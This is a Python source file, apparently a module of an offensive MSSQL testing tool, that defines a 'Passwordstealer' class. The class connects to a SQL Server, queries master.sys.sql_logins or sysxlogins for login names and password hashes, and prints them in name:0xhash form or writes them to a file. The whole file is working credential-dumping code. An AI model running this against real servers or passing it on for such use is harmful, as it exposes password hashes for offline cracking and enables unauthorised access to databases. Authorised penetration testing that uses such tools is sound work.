#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import print_function
import logging
from Mssql import Mssql
from Utils import cleanString, ErrorClass,checkOptionsGivenByTheUser
from Constants import *

class Passwordstealer (Mssql):
	'''
	To do get hashed password or logins
	'''
	#CONSTANTES
	REQ_HASH_DUMP_V2005 = "SELECT name, password_hash FROM master.sys.sql_logins"
	REQ_HASH_DUMP_V2000 = "SELECT name, password FROM master..sysxlogins"

	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		self.credentials = None
		self.args = args
		
	def credentialsAreEmpty(self):
		'''
		'''
		if self.credentials == None or self.credentials == {}: return True
		else : return False
		
	def stealHashedPasswords (self):
		'''
		Steal hashed passwords
		Return True if ok, else return False
		'''
		logging.info ("Dumping hashed password on the database server...")
		data = {}
		if self.isThe2005Version() or self.isThe2008Version() or self.isThe2012Version() or self.isThe2014Version(): data = self.executeRequest(self.REQ_HASH_DUMP_V2005,['name','password'])
		elif self.isThe2000Version() : data = self.executeRequest(self.REQ_HASH_DUMP_V2000,['name','password'])
		else:
			logging.warning ("Impossible to determine the remote database version from the following version string: '{0}'".format(self.getCompleteVersion()))
			return False
		if isinstance(data,Exception): return data
		else: 
			self.credentials = data
			logging.debug ("Hash dump: {0}".format(self.credentials))
		logging.info ("Hash dump done")
		return True
		
	def printPasswords (self):
		'''
		print passwords
		'''
		certificateBasedSQLServerLogins = []
		if self.args['save-to-file'] != None: f = open(self.args['save-to-file'],'w')
		for anAccount in self.credentials:
				if anAccount['password'] == None:
					line = "{0}:empty ({0} password is empty, not 'empty' -:)".format(anAccount['name'],None)
				else:
					line = "{0}:0x{1}".format(anAccount['name'],anAccount['password'].encode('hex'))
				if self.args['save-to-file'] != None: f.write(line+'\n')
				if anAccount['name'].endswith('##') and anAccount['name'].startswith('##'):
					certificateBasedSQLServerLogins.append(anAccount['name'])
		if self.args['save-to-file'] != None: f.close()
		if certificateBasedSQLServerLogins != []:
			print('\nThese following logins are certificate-based SQL server logins (for internal system use only): {0}'.format(", ".join(certificateBasedSQLServerLogins)))
		if self.args['save-to-file'] != None: logging.info("Hashed passwords saved in the file {0}".format(self.args['save-to-file']))
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("You can steal hashed passwords ?")
		status = self.stealHashedPasswords()
		if status == True:
			self.args['print'].goodNews("OK")
		else :
			self.args['print'].badNews("KO")
		
def runPasswordStealerModule(args):
	'''
	Run the PasswordGuesser module
	'''
	if checkOptionsGivenByTheUser(args,["dump"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	passwordstealer = Passwordstealer(args)
	passwordstealer.connect()
	if args["test-module"] == True: passwordstealer.testAll()
	args['print'].title("It is stealing hashed passwords from sql_logins table or sysxlogins table")
	status = passwordstealer.stealHashedPasswords()
	passwordstealer.closeConnection()
	if status == True:
		if passwordstealer.credentialsAreEmpty() == True:
			args['print'].badNews("No found hashed passwords on {0}:{1}/{2}".format(args['host'], args['port'], args['database']))
		else :
			args['print'].goodNews("Accounts found on {0}:{1}/{2}:".format(args['host'], args['port'], args['database']))
			passwordstealer.printPasswords()
		if args['save-to-file']: args['print'].goodNews("Credentials have been saved in the file {0}".format(args['save-to-file']))
	else: 
		args['print'].badNews("impossible to steal hashed passwords from sql_logins table or sysxlogins table")
		
